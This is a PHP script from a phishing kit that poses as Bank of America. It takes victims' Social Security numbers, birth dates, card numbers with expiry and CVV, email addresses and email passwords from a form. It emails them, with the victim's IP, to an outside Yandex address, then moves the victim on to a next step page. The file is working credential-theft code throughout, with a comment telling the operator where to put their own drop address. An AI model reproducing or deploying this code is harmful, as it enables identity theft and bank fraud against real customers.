<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------BOA Info-----------------------\n";
$message .= "SSN        : ".$_POST['ssn']."\n";
$message .= "Date of Birth        : ".$_POST["dobm"].'/'.$_POST['dobd'].'/'.$_POST['doby']."\n";
$message .= "Account Number or Credit card Number   : ".$_POST['ccn']."\n";
$message .= "Expiry Date        : ".$_POST["expm"].'/'.$_POST['expy']."\n";
$message .= "CVV        : ".$_POST['cvv']."\n";
$message .= "Email Address        : ".$_POST['eml']."\n";
$message .= "Email Password        : ".$_POST['epw']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "---------------Created BY unknown(doit)com-------------\n";
//change ur email here
$send = "mmxx1969@yandex.com";
$subject = "Result from $ip";
$headers = "From: BOA<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: step3.php");
  

?>
